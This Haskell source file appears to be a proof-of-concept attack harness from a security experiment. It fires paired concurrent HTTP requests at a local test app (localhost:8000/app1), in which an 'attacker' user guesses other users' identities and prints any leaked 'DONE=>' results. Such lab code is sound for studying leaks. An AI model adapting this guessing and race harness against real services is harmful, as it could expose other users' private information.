import Data.Functor
import Control.Exception
import Control.Concurrent
import Control.Monad
import Network.HTTP
import System.Posix.Unistd
import Data.List
import Util
import Config

main = timedMain $ do
    let attacker = 1
        users = [1..n]
    forM_ (attacker `delete` users) $ \target -> do 
      _ <- mkDone attacker False
      myTry $ forM_ users $ \guess -> do 
        m0 <- newEmptyMVar
        m1 <- newEmptyMVar
        forkIO $ mkReq m0 attacker target guess 0
        forkIO $ mkReq m1 attacker target guess 1
        v0 <- takeMVar m0
        v1 <- takeMVar m1
        maybe (return ())
              (\g -> putStrLn (show target ++ ":" ++ g) >> fail "done" ) v0
        maybe (return ())
              (\g -> putStrLn (show target ++ ":" ++ g) >> fail "done" ) v1
      --r <- mkDone attacker True
      --maybe (return ()) (\g -> putStrLn (show target ++ ":" ++ g)) r 
    where n = databaseSize
          myTry :: IO a -> IO (Either SomeException a)
          myTry = try
          mkU u = "user"++ show u
          mkReq mvar attacker target guess thread = do
            let url = "http://localhost:8000/app1"
                      ++ "?user=" ++ mkU attacker
                      ++ "&attack=" ++ mkU target
                      ++ "&guess=" ++ mkU guess
                      ++ "&thread=" ++ show thread
            r <- simpleHTTP (getRequest url)
            r' <- (take 100) <$> (getResponseBody r)
            putMVar mvar (if "DONE=>" `isPrefixOf` r' 
                            then Just $ drop 6 r'
                            else Nothing)
          mkDone attacker doPrint = do
            let url = "http://localhost:8000/app1"
                      ++ "?user=" ++ mkU attacker
                      ++ "&done=1"
                      ++ if doPrint then "&print=1" else ""
            r <- simpleHTTP (getRequest url)
            r' <- (take 100) <$> (getResponseBody r)
            return $ if "DONE=>" `isPrefixOf` r'
                       then Just $ drop 6 r'
                       else Nothing
                                     
